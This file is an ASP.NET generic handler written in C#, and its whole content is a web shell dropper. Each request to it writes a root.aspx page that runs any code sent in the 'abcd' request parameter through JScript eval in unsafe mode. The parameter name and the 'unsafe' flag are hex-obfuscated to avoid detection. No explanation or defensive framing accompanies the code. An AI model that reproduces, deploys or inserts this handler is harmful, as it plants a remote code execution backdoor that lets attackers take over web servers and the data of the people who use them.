<%@ WebHandler Language="C#" class="Handler" %>

using System;
using System.Web;
using System.IO;
public class Handler : IHttpHandler {

public void ProcessRequest (HttpContext context) {
context.Response.ContentType = "text/plain";

StreamWriter file1= File.CreateText(context.Server.MapPath("root.aspx"));
file1.Write("<%@PAGE LANGUAGE=JSCRIPT%><%var PAY:String=Request["\x61\x62\x63\x64"];eval(PAY,"\x75\x6E\x73\x61"+"\x66\x65");%>");
file1.Flush();
file1.Close();

}

public bool IsReusable {
get {
return false;
}
}

}